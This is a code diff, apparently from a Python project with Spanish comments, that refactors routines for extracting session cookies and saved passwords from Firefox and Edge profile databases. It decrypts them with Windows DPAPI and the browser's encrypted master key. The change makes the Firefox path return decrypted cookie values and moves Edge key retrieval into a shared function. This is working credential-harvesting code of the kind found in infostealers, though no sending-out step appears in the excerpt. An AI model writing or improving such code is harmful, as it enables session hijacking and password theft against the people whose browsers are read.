@@ -62,10 +62,11 @@ class CookieRepository_Firefox:
                     decrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode('utf-8')
                     path_value = win32crypt.CryptUnprotectData(path, None, None, None, 0)[1].decode('utf-8')
                 except Exception:
+                    # Si la desencriptación falla, usar el valor original
                     decrypted_value = value
                     path_value = path
                 session_cookies.append(
-                    FirefoxCookie(originAttributes, host, name, value, path, expiry, lastAccessed, isHttpOnly,
+                    FirefoxCookie(originAttributes, host, name, decrypted_value, path_value, expiry, lastAccessed, isHttpOnly,
                                   isSecure))
 
         return session_cookies
@@ -157,7 +158,7 @@ class CookieRepository_Edge:
     # Obtner las cookies de session de edge
     def get_edge_cookies(self):
         cookies = []
-        llave = self.obtener_llave_session()
+        llave = obtener_llave_session(self.directorio_llaves_edge)
         with sqlite3.connect(self.edge_db_path) as conn:
             cursor = conn.cursor()
             cursor.execute(
@@ -179,7 +180,7 @@ class CookieRepository_Edge:
     # Obtner las cookies de session de edge
     def get_edge_cookies_session(self):
         session_cookies = []
-        llave = self.obtener_llave_session()
+        llave = obtener_llave_session(self.directorio_llaves_edge)
         with sqlite3.connect(self.edge_db_path) as conn:
             cursor = conn.cursor()
             cursor.execute(
@@ -232,7 +233,7 @@ class CookieRepository_Edge:
 
 
     def obtener_contrasenias(self):
-        llave = self.obtener_llave_session()
+        llave = obtener_llave_session(self.directorio_llaves_edge)
         contrasenias = []
         with sqlite3.connect(self.edge_db_user_path) as conn:
             cursor = conn.cursor()
@@ -260,16 +261,16 @@ class CookieRepository_Edge:
             contrasenias.append(row[0])
         return contrasenias
 
-    def obtener_llave_session(self):
-        # Leer el archivo key
-        with open(self.directorio_llaves_edge, 'r', encoding='utf-8') as file:
-            file2 = file.read()  # Leer el archivo
-            # Guardar en json el archivo
-            file2 = json.loads(file2)
+def obtener_llave_session(directorio_llaves):
+    # Leer el archivo key
+    with open(directorio_llaves, 'r', encoding='utf-8') as file:
+        file2 = file.read()  # Leer el archivo
+        # Guardar en json el archivo
+        file2 = json.loads(file2)
 
-        key = base64.b64decode(file2['os_crypt']['encrypted_key'])  # Decodificar la clave en base64 a bytes
-        key = key[5:]  # Eliminar el prefijo 'DPAPI' si existe
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+    key = base64.b64decode(file2['os_crypt']['encrypted_key'])  # Decodificar la clave en base64 a bytes
+    key = key[5:]  # Eliminar el prefijo 'DPAPI' si existe
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 
 def desecriptar_dato(data ,llave):
